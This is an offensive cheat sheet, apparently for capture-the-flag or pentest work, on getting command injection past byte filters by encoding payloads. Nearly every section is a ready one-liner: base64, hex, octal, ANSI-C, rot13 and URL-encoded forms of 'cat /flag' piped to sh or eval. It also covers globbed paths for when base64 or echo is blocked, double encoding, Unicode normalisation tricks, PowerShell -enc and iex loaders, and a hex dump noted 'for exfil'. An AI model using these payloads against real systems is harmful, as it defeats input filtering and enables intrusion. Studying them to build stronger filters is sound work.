# Encoding — decode-side bypass of byte filters

## The loop — encode payload, decode at exec

Filter sees the encoded bytes; the shell decodes them before exec.

## base64 — the standard

```sh
$(echo Y2F0fGZsYWc=|base64 -d)            → cat|flag
$(echo Y2F0fGZsYWc=|base64 -d)|sh         → run decoded as shell
sh<<<$(echo Y2F0fGZsYWc=|base64 -d)
eval $(echo Y2F0fGZsYWc=|base64 -d)
echo Y2F0fGZsYWc=|base64 -d|bash
echo${IFS}Y2F0fGZsYWc=|base64${IFS}-d|sh  — no-space form
```

`base64 -d` vs `base64 -D` (BSD/macOS) vs `openssl enc -base64 -d`.

## Hex — `xxd`/`printf`/`\x` escapes

```sh
$(xxd -r -p<<<636174202f666c6167)         → 'cat /flag'
$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67')
echo '636174202f666c6167'|xxd -r -p|sh
printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67'|sh
```

`printf` understands `\xNN` in bash's builtin (and coreutils printf).
POSIX printf understands `\0NNN` octal too.

## Octal — `\NNN`

```sh
$(printf '\143\141\164\040\057\146\154\141\147')  → 'cat /flag'
echo -e '\143\141\164'
```

## URL-encoded — `%NN` — via `printf` or `sed`

```sh
$(printf '%b' 'cat%20%2fflag'|sed 's/%/\\x/g')
```

Or the app itself url-decodes — then `%3B`→`;` — the classic double-
decode issue: filter checks raw, app decodes → inject pre-encoded.

## `$'...'` ANSI-C quoting — bash escapes

```sh
$'\x63\x61\x74' /flag         → cat /flag — escape processed by bash
$'\163\165\151\144'           → octal
$'c\u0061t'                   → \u escape
$'cat\n/flag'                 — newline
```

bash-only (dash lacks `$'...'`). The filter sees `$'\x63...'` — no
`cat` substring.

## `rev`/`tr`/`rot13` transforms

```sh
$(echo tac|rev) /flag                    → cat /flag
$(echo pnf|tr 'a-z' 'n-za-m') /flag      → rot13 → cat
$(echo 'dbu'|tr 'b-z' 'a-y')             → caesar -1
```

## `eval` + encoded command — the double-decode

```sh
eval $(echo JyY7aWQ=|base64 -d)   # evals the decoded string
```

`eval` re-parses — the decoded text becomes fresh shell code —
metachars inside the encoded form never hit the filter.

## `printf` format-string abuse — `%b` interprets backslashes

`printf '%b' '\143\141\164'` — `%b` handles escapes — alternative
decoding path when `echo -e` is disabled.

## `xxd`/`od`/`openssl` — hex tools

```sh
echo 636174|xxd -r -p        → cat
echo '636174' | openssl enc -d -hex    (openssl not always present)
od -An -tx1                — hex dump for exfil
```

## Building the encoded blob — offline

```bash
echo -n 'cat /flag | base64' | base64        → Y2F0IC9mbGFnIHwgYmFzZTY0
echo -n 'cat /flag' | xxd -p | tr -d '\n'    → hex
echo -n 'cat /flag' | od -An -vto3           → octal
```

## When the filter blocks `base64`/`echo` too — glob them

```
/???/echo $x|/???/base64 -d|/???/sh
/???/print? 'x'
/???/xxd -r -p
```

## Multi-layer — encode the ENCODED

Filter checks decoded too? Double-encode: `b64(b64(payload))` decoded
twice. Filter regexes usually only one pass.

## Unicode/UTF tricks — `unicode` chars

- UTF-8 overlong encodings — legacy parsers decode `%c0%bb` → `;`
- UTF-16 with nulls — `c\x00a\x00t\x00` — some filters strip nulls
  producing `cat`
- fullwidth `；`/`｜` — some shells/apps normalize to `;`/`|`
- combining chars — `c\u0336at` renders weird, may normalize away

## Powershell encoding — `-enc`/`FromBase64String`

```powershell
powershell -enc <b64-utf16le>     — the standard PS payload format
powershell -c "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')))"
```

`powershell -enc` expects UTF-16LE base64 — generate:

```bash
echo -n 'id' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

## Falsifiers

- the filter decodes all layers before checking AND blocks decoded
  metachars too — then no encoding works; fall to argv-boundary analysis

## Output to record

- which decode form produced valid output + the encoding chain used
